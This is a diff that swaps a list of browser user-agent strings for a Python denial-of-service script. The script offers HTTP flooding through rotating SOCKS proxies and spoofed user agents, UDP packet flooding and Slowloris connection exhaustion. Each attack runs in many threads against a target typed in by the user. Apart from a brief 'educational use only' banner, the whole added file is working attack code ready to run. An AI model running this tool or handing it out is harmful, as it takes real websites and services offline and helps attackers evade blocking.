@@ -1,44 +1,266 @@
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
-Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.54
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
-Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
-Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.45 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
-Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.80 Safari/537.36
-Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
-Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
-Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
-Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36
-Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.72 Safari/537.36
-Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36
-Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36
-Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36
-Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36
+#!/usr/bin/env python3
+ # -*- coding: utf-8 -*-
+ 
+
+ import socket
+ import socks
+ import threading
+ import time
+ import random
+ import sys
+ import os
+ import logging
+ 
+
+ # ================= CONFIGURATION =================
+ 
+
+ # WARNING: Misuse of this tool can lead to serious legal consequences. Use responsibly.
+ 
+
+ # Logging Setup
+ LOG_FILE = "ddos_attack.log"
+ logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
+                    format='%(asctime)s - %(levelname)s - %(message)s')
+ 
+
+ # Colors
+ GREEN  = '\033[92m'
+ PURPLE = '\033[95m'
+ RED    = '\033[91m'
+ BLUE   = '\033[94m'
+ RESET  = '\033[0m'
+ 
+
+ # Global Variables
+ attack_running = True
+ user_agents = [] # Load from file
+ 
+
+ # Load User Agents
+ def load_user_agents(file_path="public/main/ddos/useragents.txt"):
+  global user_agents
+  try:
+  with open(file_path, 'r') as f:
+  user_agents = [line.strip() for line in f]
+  logging.info(f"Loaded {len(user_agents)} user agents from {file_path}")
+  except FileNotFoundError:
+  logging.error(f"User agent file not found: {file_path}")
+  sys.exit(1)
+ 
+
+ # Function to read proxies from a file
+ def load_proxies(proxy_file):
+  proxies = []
+  try:
+  with open(proxy_file, 'r') as file:
+  for line in file:
+  proxy = line.strip()
+  if proxy:  # Ensure the line is not empty
+  proxies.append(proxy)
+  logging.info(f"Loaded {len(proxies)} proxies from {proxy_file}")
+  except FileNotFoundError:
+  logging.error(f"Proxy file not found: {proxy_file}")
+  sys.exit(1)
+  return proxies
+ 
+
+ def log_action(message):
+  logging.info(message)
+  print(f"{BLUE}[LOG]{RESET} {message}")
+ 
+
+ # ================= ATTACK METHODS =================
+ 
+
+ def http_flood(target_url, num_requests, user_agent, proxy=None):
+  global attack_running
+  
+  try:
+  for _ in range(num_requests):
+  if not attack_running:
+  break
+  
+  headers = {
+  'User-Agent': user_agent,
+  'Cache-Control': 'no-cache',
+  'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
+  'Connection': 'keep-alive',
+  }
+  
+  if proxy:
+  try:
+  proxy_host, proxy_port = proxy.split(":")
+  proxy_port = int(proxy_port)
+  
+  s = socks.socksocket()
+  s.setproxy(socks.SOCKS5, proxy_host, proxy_port)
+  s.connect((target_url.split("//")[1].split("/")[0], 80))
+  
+  http_header = f"GET {target_url} HTTP/1.1\r\n"
+  for key, value in headers.items():
+  http_header += f"{key}: {value}\r\n"
+  http_header += "\r\n"
+  
+  s.send(http_header.encode('utf-8'))
+  
+  response = s.recv(1024)
+  log_action(f"HTTP Flood - Proxy: {proxy} - User-Agent: {user_agent} - Response: {response[:50].decode('utf-8', errors='ignore')}...")
+  s.close()
+  except Exception as e:
+  log_action(f"{RED}Error using proxy {proxy}: {e}{RESET}")
+  else:
+  try:
+  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  sock.connect((target_url.split("//")[1].split("/")[0], 80))
+  http_header = f"GET {target_url} HTTP/1.1\r\n"
+  for key, value in headers.items():
+  http_header += f"{key}: {value}\r\n"
+  http_header += "\r\n"
+  
+  sock.send(http_header.encode('utf-8'))
+  response = sock.recv(1024)
+  log_action(f"HTTP Flood - No Proxy - User-Agent: {user_agent} - Response: {response[:50].decode('utf-8', errors='ignore')}...")
+  sock.close()
+  except Exception as e:
+  log_action(f"{RED}HTTP Flood Error (No Proxy): {e}{RESET}")
+  
+  except Exception as e:
+  log_action(f"{RED}General HTTP Flood Error: {e}{RESET}")
+ 
+
+ def udp_flood(target_ip, target_port, packet_size, num_packets):
+  global attack_running
+  try:
+  sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+  for _ in range(num_packets):
+  if not attack_running:
+  break
+  data = random._urandom(packet_size)
+  sock.sendto(data, (target_ip, target_port))
+  log_action(f"UDP Flood - IP: {target_ip} - Port: {target_port} - Packet Size: {packet_size}")
+  except Exception as e:
+  log_action(f"{RED}UDP Flood Error: {e}{RESET}")
+  finally:
+  sock.close()
+ 
+
+ def slowloris(target_url):
+  global attack_running
+  try:
+  ip = target_url.split("//")[1].split("/")[0]
+  sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  sock.settimeout(4)
+  sock.connect((ip, 80))
+  sock.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode('utf-8'))
+  sock.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode('utf-8'))
+  sock.send("Accept-language: en-US,en,q=0.5\r\n".encode('utf-8'))
+  
+  while attack_running:
+  try:
+  sock.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode('utf-8'))
+  log_action(f"Slowloris - Sending keep-alive headers")
+  time.sleep(2)
+  except socket.error as e:
+  log_action(f"{RED}Slowloris socket error: {e}{RESET}")
+  break
+  except Exception as e:
+  log_action(f"{RED}Slowloris Error: {e}{RESET}")
+  break
+  except KeyboardInterrupt:
+  log_action("Stopping Slowloris attack.")
+  sock.close()
+  break
+  sock.close()
+  except socket.error as e:
+  log_action(f"{RED}Slowloris main socket error: {e}{RESET}")
+  except Exception as e:
+  log_action(f"{RED}Slowloris main error: {e}{RESET}")
+ 
+
+ # ================= MAIN FUNCTION =================
+ 
+
+ def main():
+  global attack_running
+  
+  print(f"""{GREEN}
+  ========================================================
+  || {RED}!!!  WARNING: USE RESPONSIBLY  !!!{GREEN}           ||
+  || This tool is for educational/testing purposes only.  ||
+  || Unauthorized use is illegal. The creator is NOT     ||
+  || responsible for any misuse.                         ||
+  ========================================================
+  {RESET}
+  """)
+  
+  try:
+  target_url = input(f"{PURPLE}Enter target URL (e.g., http://example.com): {RESET}")
+  attack_type = input(f"{PURPLE}Enter attack type (http, udp, slowloris): {RESET}").lower()
+  
+  if attack_type not in ['http', 'udp', 'slowloris']:
+  print(f"{RED}Invalid attack type. Choose http, udp, or slowloris.{RESET}")
+  sys.exit(1)
+  
+  load_user_agents()  # Load user agents from file
+  
+  if attack_type == 'http':
+  num_requests = int(input(f"{PURPLE}Enter number of HTTP requests per thread: {RESET}"))
+  num_threads = int(input(f"{PURPLE}Enter number of threads: {RESET}"))
+  use_proxies = input(f"{PURPLE}Use proxies? (yes/no): {RESET}").lower()
+  
+  if use_proxies == 'yes':
+  proxy_file = input(f"{PURPLE}Enter proxy file path: {RESET}")
+  proxies = load_proxies(proxy_file)
+  else:
+  proxies = []
+  
+  threads = []
+  for i in range(num_threads):
+  if proxies:
+  proxy = random.choice(proxies)
+  else:
+  proxy = None
+  user_agent = random.choice(user_agents)
+  thread = threading.Thread(target=http_flood, args=(target_url, num_requests, user_agent, proxy))
+  threads.append(thread)
+  thread.start()
+  
+  elif attack_type == 'udp':
+  target_ip = input(f"{PURPLE}Enter target IP address: {RESET}")
+  target_port = int(input(f"{PURPLE}Enter target port: {RESET}"))
+  packet_size = int(input(f"{PURPLE}Enter packet size: {RESET}"))
+  num_packets = int(input(f"{PURPLE}Enter number of packets per thread: {RESET}"))
+  num_threads = int(input(f"{PURPLE}Enter number of threads: {RESET}"))
+  
+  threads = []
+  for _ in range(num_threads):
+  thread = threading.Thread(target=udp_flood, args=(target_ip, target_port, packet_size, num_packets))
+  threads.append(thread)
+  thread.start()
+  
+  elif attack_type == 'slowloris':
+  num_threads = int(input(f"{PURPLE}Enter number of threads for Slowloris: {RESET}"))
+  threads = []
+  for _ in range(num_threads):
+  thread = threading.Thread(target=slowloris, args=(target_url,))
+  threads.append(thread)
+  thread.start()
+  
+  print(f"{GREEN}Attack started. Press Ctrl+C to stop.{RESET}")
+  
+  except KeyboardInterrupt:
+  attack_running = False
+  print(f"{RED}Stopping attack...{RESET}")
+  for thread in threads:
+  thread.join()
+  print(f"{GREEN}Attack stopped.{RESET}")
+  
+  except ValueError:
+  print(f"{RED}Invalid input. Please enter a valid number.{RESET}")
+  except Exception as e:
+  print(f"{RED}An error occurred: {e}{RESET}")
+ 
+
+ if __name__ == "__main__":
+  main()
